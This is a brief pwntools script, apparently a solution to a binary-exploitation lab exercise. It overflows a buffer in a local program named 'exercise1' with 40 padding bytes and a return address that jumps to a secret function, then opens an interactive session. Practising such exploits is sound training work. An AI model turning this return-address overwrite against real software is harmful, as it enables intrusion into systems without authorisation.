from pwn import *

context.binary = './exercise1'
p = process('./exercise1')

secret_addr = 0x401186

payload = b"A"*40 +  p64(secret_addr)
p.sendline(payload)

print(p.interactive())